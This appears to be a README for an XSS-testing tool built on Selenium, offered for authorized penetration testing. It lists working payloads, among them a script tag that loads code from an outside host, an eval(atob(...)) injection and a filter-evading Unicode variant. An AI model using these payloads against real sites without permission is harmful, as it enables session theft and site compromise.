# LiveTester.py 🛡️

`LiveTester.py` is an automated **XSS vulnerability tester** that integrates with Selenium to monitor browser activity in real-time and dynamically test discovered URL, form, and cookie parameters for reflected or DOM-based XSS vulnerabilities. You navigate while the program tests.

> ⚠️ **For authorized penetration testing only. Never run this against systems without explicit permission.**

---

## 💡 Features

- Live parameter extraction from:
  - URLs
  - Forms
  - Cookies
  - AJAX requests
- Automated XSS payload injection (GET and POST)
- Real-time alert detection and DOM reflection checks
- Dual Selenium WebDriver setup (navigation + test instance)
- Persistent state management to avoid retesting same parameters
- Configurable thread count, scope whitelist, and delay ranges
- JSON output for results, alerts, and summaries

---

## 🛠️ Requirements

Install with:

```bash
pip install -r requirements.txt
```

**`requirements.txt`:**
```txt
selenium
beautifulsoup4
requests
```
You might want to check the official chromedriver download website: https://googlechromelabs.github.io/chrome-for-testing/#stable

---

## 🚀 Usage

1. Clone the repo or copy `LiveTester.py`.
2. (Optional) Create a `config.json` file:
```json
{
  "whitelist": ["example.com"],
  "max_threads": 3,
  "delay_range": [0.2, 0.3]
}
```
3. Run the script:

```bash
python LiveTester.py
```

4. Use the opened browser to manually navigate the target app.
5. Discovered parameters will be auto-tested in the background.

---

## 📂 Output Files

| File                  | Description                                  |
|-----------------------|----------------------------------------------|
| `collected_parameters.json` | All discovered and queued parameters       |
| `collected_cookies.json`    | Cookies captured during browsing          |
| `xss_results.json`          | GET/POST payload test logs                |
| `xss_alerts.json`           | Confirmed alert/network/DOM-based XSS     |
| `xss_summary.json`          | Summary report with total stats           |
| `tested_params.json`        | Persisted tested parameter names          |

---

## 🧪 Payload Examples

Payloads include DOM and reflected XSS variations such as:

```html
<script>alert("xss")</script>
<img src=x onerror=alert("xss")>
<script src="https://js.rip/shootweb"></script>
<svg onload=alert("xss")>
"><img src=invalid.jpg onerror=eval(atob(this.id)) id=...>
```

And obfuscated / Unicode payloads like:

```html
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

---

## 🧠 Tips

- Configure your ChromeDriver path if not in system PATH.
- Use a proxy (like BurpSuite) for deeper inspection during tests.
- Make sure ChromeDriver version matches your Chrome version.
- The script respects scope via `whitelist` to avoid out-of-scope scans.

---

## ⚖️ Legal

This tool is intended for **educational and authorized security research** only. Running this against targets you do not have permission to test is illegal and unethical.

---

## 🙏 Credits

Built with ❤️ by an ethical hacker for safer web applications.

```python
# For ethical testing purposes only.
```

